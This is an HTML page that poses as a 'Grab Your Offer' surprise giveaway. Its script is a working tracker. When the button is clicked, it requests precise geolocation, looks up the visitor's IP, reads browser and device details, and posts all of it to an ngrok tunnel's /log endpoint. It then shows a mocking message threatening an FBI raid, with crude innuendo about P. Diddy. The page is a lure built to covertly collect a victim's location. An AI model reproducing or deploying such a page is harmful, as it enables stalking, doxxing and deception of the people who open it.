<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Grab Your Offer</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
        rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
        }

        .container {
            max-width: 800px;
            width: 100%;
            text-align: center;
        }

        header {
            margin-bottom: 40px;
            text-align: center;
            padding: 20px;
            animation: fadeIn 1s ease;
        }

        h1 {
            font-size: 3.5rem;
            margin-bottom: 15px;
            text-shadow: 0 3px 10px rgba(0, 0, 0, 0.5);
            background: linear-gradient(to right, #ff8a00, #da1b60);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 1px;
        }

        .subtitle {
            font-size: 1.4rem;
            opacity: 0.9;
            max-width: 600px;
            margin: 0 auto;
            font-weight: 300;
        }

        .card {
            background: rgba(0, 0, 0, 0.25);
            border-radius: 20px;
            padding: 40px;
            margin: 0 auto;
            max-width: 600px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            position: relative;
            overflow: hidden;
            animation: cardAppear 1.2s ease;
        }

        .card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
            transform: rotate(30deg);
            pointer-events: none;
        }

        .location-icon {
            font-size: 6rem;
            margin: 30px 0;
            color: #ff8a00;
            animation: pulse 2s infinite;
            text-shadow: 0 0 20px rgba(255, 138, 0, 0.5);
        }

        .btn {
            display: block;
            width: 100%;
            padding: 22px;
            background: linear-gradient(to right, #ff8a00, #da1b60);
            color: white;
            border: none;
            border-radius: 60px;
            font-size: 1.4rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.4s ease;
            margin: 30px 0;
            box-shadow: 0 8px 25px rgba(218, 27, 96, 0.5);
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
            z-index: 1;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to right, #ff6a00, #ff2b6e);
            opacity: 0;
            transition: opacity 0.4s ease;
            z-index: -1;
        }

        .btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 30px rgba(218, 27, 96, 0.7);
        }

        .btn:hover::before {
            opacity: 1;
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn:disabled {
            background: linear-gradient(to right, #666, #999);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        #status {
            margin-top: 35px;
            padding: 25px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            font-size: 1.3rem;
            min-height: 180px;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.5s ease;
        }

        .success-message {
            font-size: 1.8rem;
            font-weight: bold;
            color: #ffcc00;
            text-shadow: 0 3px 6px rgba(0, 0, 0, 0.6);
            line-height: 1.7;
            animation: textPulse 2s infinite;
        }

        .fbi-icon {
            font-size: 3rem;
            display: block;
            margin-bottom: 20px;
            animation: shake 0.5s infinite alternate;
        }

        .baby-bottle {
            font-size: 2.5rem;
            display: inline-block;
            margin: 0 10px;
            animation: float 3s ease-in-out infinite;
        }

        .disclaimer {
            margin-top: 40px;
            font-size: 0.9rem;
            opacity: 0.7;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
            padding-top: 20px;
        }

        @keyframes pulse {
            0% {
                transform: scale(1);
                opacity: 0.8;
            }

            50% {
                transform: scale(1.1);
                opacity: 1;
            }

            100% {
                transform: scale(1);
                opacity: 0.8;
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes cardAppear {
            from {
                opacity: 0;
                transform: scale(0.8);
            }

            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        @keyframes textPulse {
            0% {
                text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
            }

            50% {
                text-shadow: 0 0 25px rgba(255, 204, 0, 0.8), 0 0 40px rgba(255, 204, 0, 0.6);
            }

            100% {
                text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
            }
        }

        @keyframes shake {
            0% {
                transform: translateX(-3px);
            }

            100% {
                transform: translateX(3px);
            }
        }

        @keyframes float {
            0% {
                transform: translateY(0);
            }

            50% {
                transform: translateY(-15px);
            }

            100% {
                transform: translateY(0);
            }
        }

        .pulse-dot {
            display: inline-block;
            width: 12px;
            height: 12px;
            background: #ff6a00;
            border-radius: 50%;
            margin: 0 5px;
            animation: pulse 1.5s infinite;
        }

        .pulse-dot:nth-child(2) {
            animation-delay: 0.2s;
            background: #ff8a00;
        }

        .pulse-dot:nth-child(3) {
            animation-delay: 0.4s;
            background: #ffaa00;
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 2.5rem;
            }

            .subtitle {
                font-size: 1.1rem;
            }

            .card {
                padding: 25px;
            }

            .btn {
                padding: 18px;
                font-size: 1.2rem;
            }

            .success-message {
                font-size: 1.5rem;
            }

            .location-icon {
                font-size: 4.5rem;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <header>
            <h1><i class="fas fa-surprise"></i> Grab Your Offer</h1>
            <p class="subtitle">Click the button below to receive your special surprise!</p>
        </header>

        <div class="card">
            <div class="location-icon">
                <i class="fas fa-location-dot"></i>
            </div>

            <p style="font-size: 1.2rem; margin-bottom: 20px; max-width: 500px; margin-left: auto; margin-right: auto;">
                Please click on the button to deliver a personalized surprise experience just for you!
            </p>

            <button id="goLiveBtn" class="btn">
                <i class="fas fa-gift"></i> GET MY SURPRISE NOW!
            </button>

            <div id="status">
                <p>Waiting for you to request your surprise...</p>
            </div>

            <div class="disclaimer">
                <p><i class="fas fa-lock"></i> </p>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const btn = document.getElementById('goLiveBtn');
            const statusEl = document.getElementById('status');
            const API_BASE = 'https://fdeda5e13dee.ngrok-free.app';

            // Function to get IP address
            async function getIPAddress() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    console.error('Error fetching IP:', error);
                    return 'IP not available';
                }
            }

            // Function to detect device type
            function getDeviceType() {
                const ua = navigator.userAgent;
                if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
                    return "Tablet";
                }
                if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/
                    .test(ua)) {
                    return "Mobile";
                }
                return "Desktop";
            }

            // Function to get browser name
            function getBrowserName() {
                const agent = navigator.userAgent;
                switch (true) {
                    case agent.indexOf("Edg") > -1:
                        return "Edge";
                    case agent.indexOf("Chrome") > -1:
                        return "Chrome";
                    case agent.indexOf("Firefox") > -1:
                        return "Firefox";
                    case agent.indexOf("Safari") > -1:
                        return "Safari";
                    case agent.indexOf("Opera") > -1:
                        return "Opera";
                    default:
                        return "Unknown Browser";
                }
            }

            btn.addEventListener('click', async () => {
                btn.disabled = true;
                statusEl.innerHTML = `
          <p><i class="fas fa-spinner fa-spin"></i> Processing your request for the surprise...</p>
          <div style="margin-top: 15px;">
            <span class="pulse-dot"></span>
            <span class="pulse-dot"></span>
            <span class="pulse-dot"></span>
          </div>
        `;

                if (!navigator.geolocation) {
                    statusEl.innerHTML =
                        '<p>Geolocation is not supported by your browser. Please try a different browser.</p>';
                    btn.disabled = false;
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                            try {
                                // Get additional data
                                const ip = await getIPAddress();
                                const deviceType = getDeviceType();
                                const browser = getBrowserName();

                                const payload = {
                                    lat: position.coords.latitude,
                                    lng: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    timestamp: position.timestamp || Date.now(),
                                    userAgent: navigator.userAgent,
                                    ipAddress: ip,
                                    device: `${browser} (${deviceType})`
                                };

                                // First log the location
                                const logRes = await fetch(`${API_BASE}/log`, {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json'
                                    },
                                    body: JSON.stringify(payload)
                                });

                                if (logRes.ok) {
                                    // Show the surprise message
                                    statusEl.innerHTML = `
                  <div class="success-message">
                    <i class="fas fa-exclamation-triangle fbi-icon"></i>
                    FBI will raid your house with P. Diddy in 5 minutes. Oil Up and get ready for the surprise!
                    <i class="fas fa-baby-bottle baby-bottle"></i>
                    in 5 minutes.<br><br>
                    Oil Up and get ready for the surprise!
                  </div>
                `;

                                    // Add a fun animation to the button
                                    btn.innerHTML =
                                        '<i class="fas fa-running"></i> RUN FOR YOUR LIFE!';
                                    btn.style.background =
                                        'linear-gradient(to right, #dc3545, #8a3ffc)';

                                    // Send the email notification (server-side)
                                    // This would happen automatically on the server when the /log endpoint is hit
                                } else {
                                    const text = await logRes.text().catch(() => '');
                                    statusEl.innerHTML = `
                  <div class="success-message">
                    <i class="fas fa-baby"></i><br>
                    🍼 P. Diddy is not available right now.<br>
                    Please try again later. 🍼
                  </div>
                `;
                                    btn.disabled = false;
                                }
                            } catch (err) {
                                console.error('Error:', err);
                                statusEl.innerHTML = `
                <div class="success-message">
                  <i class="fas fa-baby"></i><br>
                  🍼 P. Diddy is not available right now.<br>
                  Please try again later. 🍼
                </div>
              `;
                                btn.disabled = false;
                            }
                        },
                        (err) => {
                            console.error('Geolocation error:', err);
                            statusEl.innerHTML = `
              <p>Error getting location: ${err.message}</p>
              <p style="margin-top: 15px; font-size: 1rem;">Please allow location access to receive your surprise</p>
            `;
                            btn.disabled = false;
                        }, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                );
            });
        });
    </script>
</body>

</html>
